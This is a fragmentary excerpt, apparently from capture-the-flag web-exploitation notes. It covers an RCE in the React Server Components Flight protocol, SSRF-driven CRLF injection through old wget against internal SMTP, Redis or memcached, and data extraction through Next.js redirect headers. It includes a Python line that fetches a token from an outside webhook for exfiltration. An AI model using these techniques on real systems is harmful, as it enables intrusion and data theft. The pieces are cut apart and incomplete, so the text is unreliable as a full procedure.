...
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
  ...
  - [Step 3 — Extract data via NEXT_REDIRECT](#step-3--extract-data-via-next_redirect)
...
```python
import requests
TOKEN = requests.post("https://[WEBHOOK_URL]/token").json()["uuid"]
...
**Key insight:** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also [core_input_processing.md](core_input_processing.md#ssrf) for other SSRF techniques.
...
### Step 3 — Extract data via NEXT_REDIRECT

Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to extract data through the `x-action-redirect` response header:
